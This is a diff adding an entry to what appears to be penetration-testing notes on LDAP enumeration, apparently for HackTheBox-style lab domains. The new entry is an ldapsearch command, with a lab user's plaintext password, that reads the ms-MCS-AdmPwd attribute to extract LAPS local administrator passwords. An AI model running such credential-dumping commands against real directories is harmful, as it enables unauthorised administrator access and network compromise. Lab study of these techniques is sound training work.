@@ -83,3 +83,10 @@ ldapsearch -H ldap://172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(obj
 ```
 ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 ```
+
+## ldapsearch - extract 'administrator' passwd from LAPS
+```
+# ldapsearch - extract 'administrator' passwd from LAPS
+ldapsearch -h streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+# src :https://malicious.link/posts/2017/dump-laps-passwords-with-ldapsearch/
+```
